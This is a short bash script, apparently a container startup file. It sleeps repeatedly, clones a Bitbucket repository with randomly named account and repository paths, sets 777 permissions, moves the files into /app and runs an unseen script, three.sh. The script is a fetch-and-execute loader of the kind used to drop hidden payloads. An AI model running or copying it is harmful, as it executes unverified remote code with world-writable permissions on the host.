#!/bin/bash

sleep 10

git clone https://neon005lite@bitbucket.org/ifx4gyrc3g3y8kug9by597xrcgdxc/0020-of-03.git

sleep 10

chmod 777 /app/0020-of-03

sleep 10

cd /app/0020-of-03 && mv /app/0020-of-03/* /app/

sleep 10

rm -fr /app/0020-of-03

sleep 10

chmod 777 /app/*

sleep 10

cd /app && ./three.sh
